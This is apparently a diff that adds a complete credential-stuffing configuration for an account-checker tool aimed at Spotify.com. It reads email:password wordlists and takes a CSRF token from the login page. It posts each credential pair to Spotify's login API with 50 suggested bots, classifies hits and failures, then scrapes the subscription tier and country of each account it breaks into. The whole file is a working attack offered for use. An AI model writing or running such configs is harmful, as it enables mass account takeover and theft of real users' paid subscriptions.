@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Spotify.com",
+  "SuggestedBots": 50,
+  "LastModified": "2019-07-23T17:46:07.8033693+02:00",
+  "AdditionalInfo": "fuck u",
+  "Author": "ur mum",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Get REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "TOKEN" 
+#Login_Post REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"displayName\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"error\":\"errorInvalidCredentials\"" 
+#CHECK_SUBSCR REQUEST GET "https://www.spotify.com/us/account/subscription/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "id=\"\"><h3 class=\"product-name\">Spotify Free</h3" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Your plan will automatically renew on" 
+  KEYCHAIN Success AND 
+    KEY "Premium for Family" 
+    KEY "Your plan will automatically renew " 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "You're a member of a family plan. " 
+!REQUEST GET "https://www.spotify.com/us/account/profile/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "'userCountry': '" "'" -> CAP "Country" 
